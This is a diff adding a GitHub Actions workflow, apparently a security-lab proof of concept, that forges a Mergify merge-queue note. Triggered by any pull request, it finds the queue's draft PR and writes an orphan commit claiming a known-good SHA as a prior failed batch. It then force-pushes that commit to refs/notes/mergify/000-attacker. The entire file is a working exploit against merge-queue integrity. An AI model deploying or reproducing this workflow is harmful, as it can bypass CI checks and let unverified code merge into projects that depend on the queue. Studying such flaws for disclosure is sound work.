@@ -1,0 +1,75 @@
+name: h1lab-forge-queue-note
+
+on:
+  pull_request:
+
+permissions:
+  contents: write
+  pull-requests: read
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Resolve the owned queue draft
+        id: target
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          CURRENT_TITLE: ${{ github.event.pull_request.title }}
+          CURRENT_HEAD: ${{ github.event.pull_request.head.sha }}
+          SOURCE_PR: ${{ github.event.pull_request.number }}
+          EVENT_UPDATED_AT: ${{ github.event.pull_request.updated_at }}
+        run: |
+          target=
+          if [[ "$CURRENT_TITLE" == "merge queue:"* ]]; then
+            target=$CURRENT_HEAD
+          else
+            for attempt in $(seq 1 20); do
+              target=$(gh api \
+                "repos/$REPO/pulls?state=open&sort=created&direction=desc&per_page=10" \
+                | jq -r --arg source "#$SOURCE_PR" \
+                    --arg after "$EVENT_UPDATED_AT" '
+                    [.[] |
+                      select(.draft == true) |
+                      select(.title | startswith("merge queue:")) |
+                      select(.created_at > $after) |
+                      select((.body // "") | contains($source))
+                    ] | first | .head.sha // empty
+                  ')
+              [ -n "$target" ] && break
+              sleep 2
+            done
+          fi
+          if [ -n "$target" ]; then
+            echo "target_sha=$target" >> "$GITHUB_OUTPUT"
+          else
+            echo "No owned queue draft observed in the bounded window."
+          fi
+
+      - name: Create a competing Mergify note
+        if: steps.target.outputs.target_sha != ''
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          TARGET_SHA: ${{ steps.target.outputs.target_sha }}
+          KNOWN_SUCCESS_SHA: e691904f23b02af5bdf2a1546183828294c19f87
+        run: |
+          note=$(printf '%s\n' \
+            "checking_base_sha: $TARGET_SHA" \
+            "previous_check_retries: []" \
+            "previous_failed_batches:" \
+            "  - batch_pr_head_sha: $KNOWN_SUCCESS_SHA")
+          tree=$(jq -n --arg path "$TARGET_SHA" --arg content "$note" \
+            '{tree: [{path: $path, mode: "100644", type: "blob",
+                      content: $content}]}' \
+            | gh api --method POST "repos/$REPO/git/trees" \
+                --input - --jq .sha)
+          commit=$(jq -n --arg tree "$tree" \
+            '{message: "h1lab owned note control", tree: $tree, parents: []}' \
+            | gh api --method POST "repos/$REPO/git/commits" \
+                --input - --jq .sha)
+          jq -n --arg sha "$commit" '{sha: $sha, force: true}' \
+            | gh api --method PATCH \
+                "repos/$REPO/git/refs/notes/mergify/000-attacker" \
+                --input - >/dev/null
